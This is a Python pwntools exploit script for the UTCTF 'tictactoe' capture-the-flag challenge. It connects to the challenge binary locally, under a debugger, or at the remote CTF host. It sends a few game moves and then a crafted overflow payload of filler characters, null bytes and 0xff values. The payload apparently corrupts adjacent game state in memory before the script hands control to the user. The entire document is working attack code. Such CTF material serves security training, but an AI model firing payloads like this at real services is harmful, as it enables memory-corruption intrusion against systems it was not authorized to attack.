#!/usr/bin/env python3

from pwn import *

exe = ELF("tictactoe")

context.binary = exe
context.terminal = "konsole".split()

def conn():
    if args.REMOTE:
        io = remote("challenge.utctf.live", 7114)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            b *0x0000000000401b03
            b *0x0000000000401cb5
            b *0x401cc5
            b *0x401cb1
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    r = conn()

    r.sendline(b"x")
    r.sendline(b"5")
    r.sendline(b"3")
    r.sendline(b"4")
    r.sendline(b"1xxxxxxxxxxxx\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LMNOPQRSTUVWXYZ\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00")

    r.interactive()


if __name__ == "__main__":
    main()
